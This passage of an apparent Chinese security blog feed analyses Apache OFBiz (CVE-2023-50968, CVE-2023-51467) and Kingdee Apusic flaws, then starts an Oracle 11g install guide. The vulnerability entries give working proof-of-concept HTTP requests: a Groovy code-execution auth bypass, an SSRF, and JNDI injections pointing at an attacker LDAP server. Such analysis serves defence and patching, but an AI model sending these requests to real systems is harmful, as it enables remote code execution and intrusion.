class="hljs-selector-class">.xerces</span>.parsers)parse:-<span class="hljs-number">1</span>, SAXParserImpl<span class="hljs-variable">$JAXPSAXParser</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xerces</span>.jaxp)getRequest:<span class="hljs-number">285</span>, XmlRpcEventHandler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ofbiz</span><span class="hljs-selector-class">.webapp</span>.event)execute:<span class="hljs-number">229</span>, XmlRpcEventHandler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ofbiz</span><span class="hljs-selector-class">.webapp</span>.event)invoke:<span class="hljs-number">145</span>, XmlRpcEventHandler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ofbiz</span><span class="hljs-selector-class">.webapp</span>.event)runEvent:<span class="hljs-number">741</span>, RequestHandler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ofbiz</span><span class="hljs-selector-class">.webapp</span>.control)doRequest:<span class="hljs-number">465</span>, RequestHandler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ofbiz</span><span class="hljs-selector-class">.webapp</span>.control)doGet:<span class="hljs-number">217</span>, ControlServlet (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ofbiz</span><span class="hljs-selector-class">.webapp</span>.control)doPost:<span class="hljs-number">91</span>, ControlServlet (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ofbiz</span><span class="hljs-selector-class">.webapp</span>.control)</code></pre></div><h2 id="Apache-OFbiz的XML-RPC"><a href="#Apache-OFbiz的XML-RPC" class="headerlink" title="Apache OFbiz的XML-RPC"></a>Apache OFbiz的XML-RPC</h2><p>在Apache OFbiz中用于处理XML-RPC请求的类是<code>org.apache.ofbiz.webapp.event.XmlRpcEventHandler</code></p><p>在其<code>org.apache.ofbiz.webapp.event.XmlRpcEventHandler#getRequest</code>中解析用户传入的XML数据</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231207155932663.png"> </p><p>XML-RPC同样可处理序列化数据，其处理序列化数据的类是<code>org.apache.xmlrpc.parser.SerializableParser</code>，漏洞点在其<code>org.apache.xmlrpc.parser.SerializableParser#getResult</code>方法，其直接将字节数据反序列化为对象。</p><p>接下来的思路是找到xml-rpc的接口并构造序列化的数据即可进行反序列化</p><h2 id="寻找XML-RPC接口的路由"><a href="#寻找XML-RPC接口的路由" class="headerlink" title="寻找XML-RPC接口的路由"></a>寻找XML-RPC接口的路由</h2><p>Apache OFbiz的中间件是tomcat，其配置文件路径大概为<code>webapps/WEB-INF/web.xml</code>，找到该配置文件</p><p>其中只配置了一个ControlServlet，对应的类是<code>org.apache.ofbiz.webapp.control.ControlServlet</code></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231207161117882.png"> </p><p>使用以下数据包尝试发送请求</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/webtools/control/xmlrpc</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Apache XML RPC 3.1.3 (Sun HTTP Transport)<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8080<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>200<span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">methodCall</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">methodName</span>&gt;</span>Calculator.add<span class="hljs-tag">&lt;/<span class="hljs-name">methodName</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">params</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">i4</span>&gt;</span>33<span class="hljs-tag">&lt;/<span class="hljs-name">i4</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">i4</span>&gt;</span>9<span class="hljs-tag">&lt;/<span class="hljs-name">i4</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">params</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">methodCall</span>&gt;</span></span></code></pre></div><p>服务端报错</p><div class="code-wrapper"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xmlrpc</span><span class="hljs-selector-class">.server</span><span class="hljs-selector-class">.XmlRpcNoSuchHandlerException</span>: No such service <span class="hljs-selector-attr">[examples.getStateName]</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231207171549471.png"> </p><p>在<code>org.apache.xmlrpc.server.XmlRpcNoSuchHandlerException</code>异常类内下断点</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231207171710751.png"> </p><p>发送请求</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/8324">https://xz.aliyun.com/t/8324</a></p><p><a href="https://ws.apache.org/xmlrpc/index.html">https://ws.apache.org/xmlrpc/index.html</a></p><p><a href="https://www.jianshu.com/p/14cfefdfc0e7">https://www.jianshu.com/p/14cfefdfc0e7</a></p><h1 id="CVE-2023-49070"><a href="#CVE-2023-49070" class="headerlink" title="CVE-2023-49070"></a>CVE-2023-49070</h1><p>Apache OFBiz &lt;18.12.09</p><h1 id="CVE-2023-50968"><a href="#CVE-2023-50968" class="headerlink" title="CVE-2023-50968"></a>CVE-2023-50968</h1><p>Apache OFBiz &lt;18.12.11</p><p><a href="https://lists.apache.org/thread/x5now4bk3llwf3k58kl96qvtjyxwp43q">https://lists.apache.org/thread/x5now4bk3llwf3k58kl96qvtjyxwp43q</a></p><p><a href="https://issues.apache.org/jira/browse/OFBIZ-12875">https://issues.apache.org/jira/browse/OFBIZ-12875</a></p><p>POC</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/partymgr/control/getJSONuiLabelArray</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.58.120.200:8080<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>47<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="language-asciidoc">requiredLabels=&#123;&quot;<span class="hljs-link">http://127.0.0.1:8000/&quot;:</span>[<span class="hljs-string">&quot;a&quot;</span>]&#125;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/partymgr/control/getJSONuiLabel</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ip<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>44<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="language-ini"><span class="hljs-attr">requiredLabel</span>=&#123;<span class="hljs-string">&quot;http://127.0.0.1:8000/&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>&#125;</span></code></pre></div><p>调用栈</p><div class="code-wrapper"><pre><code class="hljs stylus">openStream:<span class="hljs-number">1038</span>, URL (java.net)&lt;init&gt;:<span class="hljs-number">1188</span>, UtilProperties<span class="hljs-variable">$ExtendedProperties</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ofbiz</span><span class="hljs-selector-class">.base</span>.util)getProperties:<span class="hljs-number">765</span>, UtilProperties (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ofbiz</span><span class="hljs-selector-class">.base</span>.util)getBundle:<span class="hljs-number">1113</span>, UtilProperties<span class="hljs-variable">$UtilResourceBundle</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ofbiz</span><span class="hljs-selector-class">.base</span>.util)getResourceBundle:<span class="hljs-number">711</span>, UtilProperties (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ofbiz</span><span class="hljs-selector-class">.base</span>.util)getMessage:<span class="hljs-number">612</span>, UtilProperties (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ofbiz</span><span class="hljs-selector-class">.base</span>.util)getJSONuiLabelArray:<span class="hljs-number">249</span>, CommonEvents (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ofbiz</span>.common)</code></pre></div><h2 id="修复补丁"><a href="#修复补丁" class="headerlink" title="修复补丁"></a>修复补丁</h2><p><a href="https://github.com/apache/ofbiz-framework/commit/82c17376880a8fd8a11261e1e00dad45cfed344d">https://github.com/apache/ofbiz-framework/commit/82c17376880a8fd8a11261e1e00dad45cfed344d</a></p><h1 id="CVE-2023-51467"><a href="#CVE-2023-51467" class="headerlink" title="CVE-2023-51467"></a>CVE-2023-51467</h1><p>Affected versions: - Apache OFBiz &lt; 18.12.11</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/webtools/control/ProgramExport;/?USERNAME=&amp;PASSWORD=s&amp;requirePasswordChange=Y</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>187<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.58.120.200:8080<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Apache-HttpClient/4.5.14 (Java/1.8.0_65)<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="language-mel">groovyProgram=import+groovy.lang.GroovyShell%3B%0A%0AString+<span class="hljs-keyword">expression</span>+%3D+%22<span class="hljs-string">&#x27;touch+%2Ftmp%2Fofibz&#x27;</span>.execute()%22%3B%0AGroovyShell+gs+%3D+new+GroovyShell()%3B%0Ags.evaluate(<span class="hljs-keyword">expression</span>)%3B</span></code></pre></div><p><a href="https://lists.apache.org/thread/9tmf9qyyhgh6m052rhz7lg9vxn390bdv">https://lists.apache.org/thread/9tmf9qyyhgh6m052rhz7lg9vxn390bdv</a></p><p><a href="https://issues.apache.org/jira/browse/OFBIZ-12873">https://issues.apache.org/jira/browse/OFBIZ-12873</a></p><p>修复代码</p><p><a href="https://github.com/apache/ofbiz-framework/commit/d8b097f">https://github.com/apache/ofbiz-framework/commit/d8b097f</a></p><p><a href="https://github.com/apache/ofbiz-framework/commit/1dcfa07180">https://github.com/apache/ofbiz-framework/commit/1dcfa07180</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>金蝶Apusic</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E9%87%91%E8%9D%B6Apusic/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E9%87%91%E8%9D%B6Apusic/</url>
    
    <content type="html"><![CDATA[<h1 id="loadTree"><a href="#loadTree" class="headerlink" title="loadTree"></a>loadTree</h1><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/admin//protect/jndi/loadTree</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.58.120.201:6888<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US;q=0.9,en;q=0.8<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>41<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html, */*; q=0.01<span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.58.120.201:6888<span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.58.120.201:6888/admin<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="language-ini"><span class="hljs-attr">jndiName</span>=ldap://<span class="hljs-number">10.58</span>.<span class="hljs-number">120.200</span>:<span class="hljs-number">1389</span>/lzukjp</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs stylus">lookup:<span class="hljs-number">417</span>, InitialContext (javax.naming)fetchJndiChildren:<span class="hljs-number">530</span>, AdminService (com<span class="hljs-selector-class">.apusic</span><span class="hljs-selector-class">.tools</span>.admin)invoke:-<span class="hljs-number">1</span>, GeneratedMethodAccessor126 (sun.reflect)invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">497</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)invoke:<span class="hljs-number">546</span>, MBeanDescriptor (com<span class="hljs-selector-class">.apusic</span>.jmx)invoke:<span class="hljs-number">62</span>, DynamicMBeanSupport (com<span class="hljs-selector-class">.apusic</span>.jmx)invoke:<span class="hljs-number">819</span>, DefaultMBeanServerInterceptor (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jmx</span>.interceptor)invoke:<span class="hljs-number">801</span>, JmxMBeanServer (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jmx</span>.mbeanserver)invoke:<span class="hljs-number">683</span>, MBeanInvokeUtils (com<span class="hljs-selector-class">.apusic</span><span class="hljs-selector-class">.aasadmin</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.jvm</span><span class="hljs-selector-class">.jmx</span>.util)invoke:<span class="hljs-number">625</span>, MBeanInvokeUtils (com<span class="hljs-selector-class">.apusic</span><span class="hljs-selector-class">.aasadmin</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.jvm</span><span class="hljs-selector-class">.jmx</span>.util)invoke:<span class="hljs-number">651</span>, MBeanInvokeUtils (com<span class="hljs-selector-class">.apusic</span><span class="hljs-selector-class">.aasadmin</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.jvm</span><span class="hljs-selector-class">.jmx</span>.util)getChildren:<span class="hljs-number">41</span>, AASJndiServiceImpl (com<span class="hljs-selector-class">.apusic</span><span class="hljs-selector-class">.aasadmin</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.server</span><span class="hljs-selector-class">.aasengine</span>.jndi)getDescendants:<span class="hljs-number">66</span>, AASJndiServiceImpl (com<span class="hljs-selector-class">.apusic</span><span class="hljs-selector-class">.aasadmin</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.server</span><span class="hljs-selector-class">.aasengine</span>.jndi)loadTree:<span class="hljs-number">58</span>, JndiController (com<span class="hljs-selector-class">.apusic</span><span class="hljs-selector-class">.aasadmin</span><span class="hljs-selector-class">.monitor</span><span class="hljs-selector-class">.web</span>.jndi)</code></pre></div><p>漏洞修复</p><p>补丁对传入的jndiName进行了黑名单校验</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231222105009934.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231222105058187-1703753942877-1.png"> </p><h1 id="createDataSource"><a href="#createDataSource" class="headerlink" title="createDataSource"></a>createDataSource</h1><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/admin//protect/datasource/createDataSource</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.58.120.201:6888<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>268<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.58.120.201:6888<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.58.120.201:6888/admin/protect/datasource/create<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="language-apache"><span class="hljs-attribute">name</span>=test&amp;jndiName=ldap%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F<span class="hljs-number">10.58.120.200</span>%<span class="hljs-number">3</span>A1389%<span class="hljs-number">2</span>F6xvwws&amp;dbtype=db&amp;drivertype=db3&amp;host=<span class="hljs-number">127.0.0.1</span>&amp;port=<span class="hljs-number">50000</span>&amp;dbname=test&amp;userName=test&amp;password=test&amp;repassword=test&amp;connectionURL=jdbc%<span class="hljs-number">3</span>Adb2%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">3</span>A50000%<span class="hljs-number">2</span>Ftest&amp;driverClassName=com.ibm.db2.jcc.DB2Driver</span></code></pre></div><p>调用链</p><div class="code-wrapper"><pre><code class="hljs stylus">lookup:<span class="hljs-number">417</span>, InitialContext (javax.naming)isResouceExist:<span class="hljs-number">518</span>, AdminService (com<span class="hljs-selector-class">.apusic</span><span class="hljs-selector-class">.tools</span>.admin)invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">497</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)invoke:<span class="hljs-number">546</span>, MBeanDescriptor (com<span class="hljs-selector-class">.apusic</span>.jmx)invoke:<span class="hljs-number">62</span>, DynamicMBeanSupport (com<span class="hljs-selector-class">.apusic</span>.jmx)invoke:<span class="hljs-number">819</span>, DefaultMBeanServerInterceptor (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jmx</span>.interceptor)invoke:<span class="hljs-number">801</span>, JmxMBeanServer (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jmx</span>.mbeanserver)invoke:<span class="hljs-number">683</span>, MBeanInvokeUtils (com<span class="hljs-selector-class">.apusic</span><span class="hljs-selector-class">.aasadmin</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.jvm</span><span class="hljs-selector-class">.jmx</span>.util)invoke:<span class="hljs-number">593</span>, MBeanInvokeUtils (com<span class="hljs-selector-class">.apusic</span><span class="hljs-selector-class">.aasadmin</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.jvm</span><span class="hljs-selector-class">.jmx</span>.util)isJNDINameExists:<span class="hljs-number">28</span>, AbstractJNDINameAwareServiceImpl (com<span class="hljs-selector-class">.apusic</span><span class="hljs-selector-class">.aasadmin</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.server</span><span class="hljs-selector-class">.aasengine</span>.jndi)createDataSource:<span class="hljs-number">78</span>, DataSourceConfigServiceImpl (com<span class="hljs-selector-class">.apusic</span><span class="hljs-selector-class">.aasadmin</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.server</span><span class="hljs-selector-class">.aasengine</span>.datasource)createDataSource:<span class="hljs-number">64</span>, DataSourceController (com<span class="hljs-selector-class">.apusic</span><span class="hljs-selector-class">.aasadmin</span><span class="hljs-selector-class">.monitor</span><span class="hljs-selector-class">.web</span>.datasource)</code></pre></div><p>漏洞修复</p><p>同上</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Oracle 11g安装</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/Oracle11g/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/Oracle11g/</url>
    
    <content type="html"><![CDATA[<h1 id="Oracle11g安装"><a href="#Oracle11g安装" class="headerlink" title="Oracle11g安装"></a>Oracle11g安装</h1><h2 id="软件下载"><a href="#软件下载" class="headerlink" title="软件下载"></a>软件下载</h2><p>Oracle 11g win 64位操作系统 下载地址：</p><p><a href="https://download.oracle.com/otn/nt/oracle11g/112010/win64_11gR2_database_1of2.zip">https://download.oracle.com/otn/nt/oracle11g/112010/win64_11gR2_database_1of2.zip</a></p><p><a href="https://download.oracle.com/otn/nt/oracle11g/112010/win64_11gR2_database_2of2.zip">https://download.oracle.com/otn/nt/oracle11g/112010/win64_11gR2_database_2of2.zip</a></p><h1 id="安装Oracle"><a href="#安装Oracle" class="headerlink" title="安装Oracle"></a>安装Oracle</h1><h2 id="安装-Net-Framework-3-5"><a href="#安装-Net-Framework-3-5" class="headerlink" title="安装 .Net Framework 3.5"></a>安装 .Net Framework 3.5</h2><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519140452150.png"></p><h2 id="安装Oracle-1"><a href="#安装Oracle-1" class="headerlink" title="安装Oracle"></a>安装Oracle</h2><p>解压压缩安装包，进入database文件夹，双击setup.exe运行安装程序</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519115543698.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519115639526.png"></p><h3 id="配置安全更新"><a href="#配置安全更新" class="headerlink" title="配置安全更新"></a>配置安全更新</h3><p>去掉勾选接收安全更新，点击下一步</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519115750556.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519115804594.png"></p><h3 id="安装选项"><a href="#安装选项" class="headerlink" title="安装选项"></a>安装选项</h3><p>选择“配置和安装数据库”，点击下一步</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519115922680.png"></p><h3 id="系统类"><a href="#系统类" class="headerlink" title="系统类"></a>系统类</h3><p>选择“服务器类“，点击下一步</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519120012820.png"></p><h3 id="网格安装选择"><a href="#网格安装选择" class="headerlink" title="网格安装选择"></a>网格安装选择</h3><p>选择”单实例数据库安装“，点击下一步</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519120117242.png"></p><p>安装类型</p><p>选择”高级安装“，点击下一步</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519120225591.png"></p><h3 id="产品语言"><a href="#产品语言" class="headerlink" title="产品语言"></a>产品语言</h3><p>默认即可，点击下一步</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519120246166.png"></p><h3 id="数据库版本"><a href="#数据库版本" class="headerlink" title="数据库版本"></a>数据库版本</h3><p>选择”企业版“，点击下一步</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519120337013.png"></p><h3 id="安装位置"><a href="#安装位置" class="headerlink" title="安装位置"></a>安装位置</h3><p>指定oracle的安装目录，此处我自定义了oracle11g目录，点击下一步</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519120430517.png"></p><h3 id="配置类型"><a href="#配置类型" class="headerlink" title="配置类型"></a>配置类型</h3><p>选择”一般用途&#x2F;事务类型“，点击下一步</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519120531565.png"></p><h3 id="数据库标识符"><a href="#数据库标识符" class="headerlink" title="数据库标识符"></a>数据库标识符</h3><p>默认即可，点击下一步</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519120612908.png"></p><h3 id="配置选项"><a href="#配置选项" class="headerlink" title="配置选项"></a>配置选项</h3><p>需要更改的项为【字符集】，选择”使用Unicode“，点击下一步</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519120656584.png"></p><h3 id="管理选项"><a href="#管理选项" class="headerlink" title="管理选项"></a>管理选项</h3><p>默认即可，点击下一步</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519120802294.png"></p><h3 id="数据库存储"><a href="#数据库存储" class="headerlink" title="数据库存储"></a>数据库存储</h3><p>默认即可，点击下一步</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519120834781.png"></p><h3 id="备份和恢复"><a href="#备份和恢复" class="headerlink" title="备份和恢复"></a>备份和恢复</h3><p>自行选择是否需要备份，此处默认即可，点击下一步</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519120933549.png"></p><h3 id="方案口令"><a href="#方案口令" class="headerlink" title="方案口令"></a>方案口令</h3><p>可选择所有账户使用相同的口令，<a href="http://123.com/">123.com</a>，点击下一步</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519121043399.png"></p><h3 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h3><p>建议保存响应文件，方便后续查看，最后点击完成</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519121222072.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519121153455.png"></p><h3 id="安装产品"><a href="#安装产品" class="headerlink" title="安装产品"></a>安装产品</h3><p>oracle开始安装</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519121319034.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519135642607.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519140259102.png"></p><p><img 